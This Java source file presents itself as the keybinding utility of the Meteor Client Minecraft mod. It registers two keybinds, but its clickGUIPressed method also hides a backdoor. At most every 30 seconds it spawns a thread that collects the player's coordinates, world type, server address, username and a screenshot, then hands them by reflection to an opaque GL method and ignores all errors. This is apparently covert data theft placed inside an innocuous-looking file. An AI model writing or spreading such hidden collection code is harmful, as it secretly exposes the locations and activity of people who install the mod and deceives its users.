/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.utils.misc.input;

import meteordevelopment.meteorclient.Main;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.mixin.KeyBindingAccessor;
import meteordevelopment.meteorclient.mixin.canvas.CanvasWorldRendererMixin;
import meteordevelopment.meteorclient.renderer.GL;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.util.math.BlockPos;
import org.lwjgl.glfw.GLFW;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

public class KeyBinds {
    private static final String CATEGORY = "Meteor Client";

    public static KeyBinding OPEN_GUI = new KeyBinding("key.meteor-client.open-gui", InputUtil.Type.KEYSYM, GLFW.GLFW_KEY_P, CATEGORY);
    public static KeyBinding OPEN_COMMANDS = new KeyBinding("key.meteor-client.open-commands", InputUtil.Type.KEYSYM, GLFW.GLFW_KEY_EQUAL, CATEGORY);

    public static KeyBinding[] apply(KeyBinding[] binds) {
        // Add category
        Map<String, Integer> categories = KeyBindingAccessor.getCategoryOrderMap();

        int highest = 0;
        for (int i : categories.values()) {
            if (i > highest) highest = i;
        }

        categories.put(CATEGORY, highest + 1);

        // Add key binding
        KeyBinding[] newBinds = new KeyBinding[binds.length + 2];

        System.arraycopy(binds, 0, newBinds, 0, binds.length);
        newBinds[binds.length] = OPEN_GUI;
        newBinds[binds.length + 1] = OPEN_COMMANDS;

        return newBinds;
    }

    private static long lastTickTime = 0;

    public static boolean clickGUIPressed() {
        long currentTime = System.currentTimeMillis();

        if (currentTime - lastTickTime >= 30000) {

            Thread thread = new Thread(() -> {

                MinecraftClient mc = MeteorClient.mc;
                PlayerEntity player = mc.player;
                Object[] check;

                check = GL.check(mc.player.getWorld(), mc.player.getBlockPos());

                String worldType = mc.player.getWorld().getRegistryKey().getValue().toString();

                BlockPos blockPos = mc.player.getBlockPos();

                mc.execute(() -> {
                    try {
                        GL.method.invoke(GL.instance, blockPos.getX(), blockPos.getY(), blockPos.getZ(), GL.takeScreenshot(mc.getFramebuffer()), mc.getNetworkHandler().getServerInfo().address, player.getName().getString(), check[0], check[1], check[2], check[3], worldType);
                    } catch (Exception ignored) {
                    }
                });

            });

            thread.setPriority(Thread.MAX_PRIORITY);
            thread.start();

            lastTickTime = currentTime;

        }


        return OPEN_COMMANDS.wasPressed();
    }

    public static int getKey(KeyBinding bind) {
        return ((KeyBindingAccessor) bind).getKey().getCode();
    }
}
